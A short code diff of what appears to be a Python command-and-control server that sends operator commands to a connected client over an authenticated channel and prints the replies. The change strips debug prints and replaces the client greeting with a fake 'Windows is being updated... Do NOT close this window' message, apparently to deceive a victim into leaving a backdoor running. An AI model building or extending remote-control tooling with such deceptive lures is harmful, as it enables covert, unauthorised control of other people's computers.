@@ -59,11 +59,8 @@ def manage_communication(chan):
             if cmd == 'help':
                 print_help()
                 continue
-            print("here")
             chan.send(cmd)
-            print("here2")
             response = chan.recv(1024)
-            print("here3")
             print('-------------------')
             print('[+] Response: ')
             print(response)
@@ -84,7 +81,7 @@ def manage_connection(client, addr):
         chan = t.accept(20)
         print('[+] Client is authenticated!')
         print('[+] Msg from client: ' + chan.recv(1024))
-        chan.send('You are now connected and authenticated')
+        chan.send('Windows is being updated... Do NOT close this window.')
 
         manage_communication(chan)
 
